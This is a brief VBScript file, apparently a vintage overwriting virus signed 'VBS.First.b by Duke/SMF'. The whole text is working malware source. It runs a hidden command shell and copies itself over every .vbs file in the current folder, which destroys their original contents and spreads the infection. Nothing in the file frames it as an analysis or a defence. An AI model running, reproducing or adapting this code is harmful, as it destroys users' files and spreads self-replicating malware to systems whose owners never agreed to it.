Set WshShell = Wscript.CreateObject("Wscript.Shell")
Set WshSysEnv = WshShell.Environment("Process")
CP = WshSysEnv("comspec")
WshShell.Run (CP & " /c for %%v in (*.vbs) do copy /y " & Wscript.ScriptFullName & " %%v>nul"), vbHide
'VBS.First.b by Duke/SMF
